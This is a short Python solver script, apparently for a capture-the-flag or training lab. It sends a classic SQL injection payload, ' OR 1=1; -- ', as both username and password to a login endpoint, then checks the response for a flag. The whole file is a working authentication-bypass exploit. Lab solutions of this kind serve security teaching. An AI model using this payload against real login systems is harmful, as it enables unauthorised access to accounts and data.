import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://login.quoccacorp.com/v4"

"""
 OR 1=1; -- \
"""
PAYLOAD = " OR 1=1; -- \\"

class Solver:
    def __init__(self):
        self.session = get_session()

    def has_error(self, response):
        ERRORS = ["500 Internal Server Error", "Incorrect username or password"]
        return any(error in response.text for error in ERRORS)

    def main(self):
        print(f"{PAYLOAD}\n")

        response = self.session.post(BASE_URL, data={"username": PAYLOAD, "password": PAYLOAD})
        find_flag(response.text)

        print('✅' * 10 if not self.has_error(response) else '❌' * 10)

if __name__ == "__main__":
    Solver().main()